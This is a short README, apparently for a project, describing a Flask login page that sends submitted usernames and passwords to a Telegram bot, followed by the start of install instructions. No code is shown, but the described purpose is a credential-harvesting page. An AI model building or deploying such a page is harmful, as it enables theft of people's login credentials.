# Flask Telegram Login Page

This is a simple Flask login page that sends username and password to a Telegram bot.

## How to run locally

1. Install dependencies:
```bash
pip install -r requirements.txt
